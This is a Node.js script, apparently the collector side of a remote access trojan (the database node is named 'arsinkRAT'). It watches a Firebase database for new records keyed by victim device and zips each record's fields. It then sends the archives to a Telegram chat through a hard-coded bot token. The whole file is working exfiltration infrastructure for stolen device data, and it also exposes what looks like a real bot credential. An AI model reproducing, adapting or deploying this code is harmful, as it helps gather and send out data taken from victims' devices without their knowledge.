// Install dulu:
// npm install firebase-admin node-fetch archiver fs path form-data

const admin = require("firebase-admin");
const fetch = require("node-fetch");
const fs = require("fs");
const path = require("path");
const archiver = require("archiver");
const FormData = require("form-data");

// === KONFIGURASI TELEGRAM ===
const BOT_TOKEN = "7751007422:AAGWa-ZxOS1r6Cr3Eqnh50iL3nBhk_CHt_s";
const CHAT_ID = "7570665912";

// === KONFIGURASI FIREBASE ADMIN ===
admin.initializeApp({
  credential: admin.credential.cert(require("./server.json")), // File JSON service account Firebase
  databaseURL: "https://surrxratprv-default-rtdb.firebaseio.com/"
});

const db = admin.database();
const ref = db.ref("arsinkRAT");

ref.on("child_added", async (snapshot) => {
  const key = snapshot.key;
  const data = snapshot.val();
  const devName = sanitizeFilename(data.dev || "UnknownDev");

  // Nama file zip
  const zipName = `${devName} - ${key}.zip`;
  const zipPath = path.join(__dirname, zipName);

  await new Promise((resolve, reject) => {
    const output = fs.createWriteStream(zipPath);
    const archive = archiver("zip", { zlib: { level: 9 } });

    output.on("close", resolve);
    archive.on("error", reject);

    archive.pipe(output);

    // Setiap field dijadikan file txt
    for (let field in data) {
      if (data.hasOwnProperty(field)) {
        archive.append(String(data[field]), { name: `${field}.txt` });
      }
    }

    archive.finalize();
  });

  // Kirim ke Telegram
  await sendToTelegram(zipPath, zipName);

  // Hapus file zip setelah terkirim
  fs.unlinkSync(zipPath);
});

async function sendToTelegram(filePath, fileName) {
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("document", fs.createReadStream(filePath), fileName);

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
    method: "POST",
    body: form
  });

  console.log(`File ${fileName} terkirim ke Telegram`);
}

function sanitizeFilename(name) {
  return name.replace(/[<>:"/\\|?*]+/g, "_");
}